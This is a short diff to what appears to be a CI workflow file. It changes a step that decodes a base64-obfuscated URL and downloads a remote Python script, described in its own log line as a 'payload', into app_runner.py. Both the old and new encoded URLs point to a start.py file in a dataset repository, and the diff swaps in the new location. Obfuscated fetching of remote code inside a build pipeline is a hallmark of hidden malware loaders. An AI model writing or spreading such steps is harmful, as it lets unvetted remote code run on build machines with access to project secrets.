@@ -72,7 +72,7 @@ jobs:
       - name: Fetch Executable Script
         run: |
           echo "[3/3] Decoding target URL and downloading payload..."
-          REMOTE_SRC=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          REMOTE_SRC=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrMS9mb2Zmby9yZXNvbHZlL21haW4vc3RhcnQucHk=" | base64 -d)
           curl -sL "${REMOTE_SRC}" -o app_runner.py
           echo "[3/3] Download complete."
 
